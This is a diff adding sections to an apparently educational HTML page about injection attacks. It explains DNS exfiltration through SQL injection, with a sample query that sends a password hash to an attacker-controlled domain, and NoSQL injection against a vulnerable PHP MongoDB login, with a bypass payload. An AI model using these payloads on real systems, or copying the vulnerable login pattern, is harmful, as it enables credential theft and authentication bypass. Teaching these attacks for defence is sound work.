@@ -304,3 +304,37 @@ browser:</p>
       <ul>User-Agent: aaa' or 1/*</ul>
       <ul>Referer: http://www.hackerswebsite.com</ul>
     </ol></p>
+
+    <h1>DNS Exfiltration using SQL Injection</h1>
+    <p>Attackers use DNS exfiltration to extract data, such as password hashes from a DNS request. The DNS request sent by the attacker can possibly pass through the database server to an arbitrary host.
+    Attackers embed the output of a malicious SQL query in a DNS request and capture the DNS response sent by the server. Example:</p>
+    <p><ol>
+      <ul>do_dns_lookup((select top 1 password from users) + '.certifiedhacker.com');</ul>
+    </ol></p>
+    <p>An attacker uses the SELECT statement for acquiring the password hash by appending a domain name to the end of the statement. The attacker then performs a DNS lookup for a fabricated hostname and runs 
+    a packet sniffer to capture packets from the name server of the target domain and retrieves the password hash from the DNS record.</p>
+    <p><ol>
+      <ul>appserver.example.com.5678 > ns.certifiedhacker.com.53 A?</ul>
+      <ul>0x4a6f686e.certifiedhacker.com</ul>
+    </ol></p>
+
+    <h1>MongoDB Injection / NoSQL Injection Attack</h1>
+    <p>MongoDB uses a NoSQL database, vulnerable to various NoSQL injection attacks. The web applications that use a MongoDB db may contain this vulnerability in its authentication code, allowing to bypass the 
+    authentication process. </p>
+    <p>Attackers use MongoDB operations such as $eq (equals), $ne (not equal to), $gt (greather than), $gte (greather than or equal to) and [$regex] to create a malicious command to bypass the authentication procedure.</p>
+    <p><ol>
+      <ul>$user_name = $_POST['username'];</ul>
+      <ul>$pwd = $_POST['password'];</ul>
+      <ul>$new_conn = new MongoDB\Client('mongodb://localhost:27017');</ul>
+      <ul>if($new_conn) {</ul>
+      <ul>$mydb = $new_conn->mytest;</ul>
+      <ul>$users = $mydb->users;</ul>
+      <ul>$myquery = array(</ul>
+      <ul>"user" => $user_name,</ul>
+      <ul>"password" => $pwd</ul>
+      <ul>);</ul>
+      <ul>$myreq = $users->findOne($myquery);</ul>
+      <ul>}</ul>
+    </ol></p>
+    <p>Attackers use an empty string to trick the database into displaying the list of users:<br/>
+    <i>'; return '' == '</i></p>
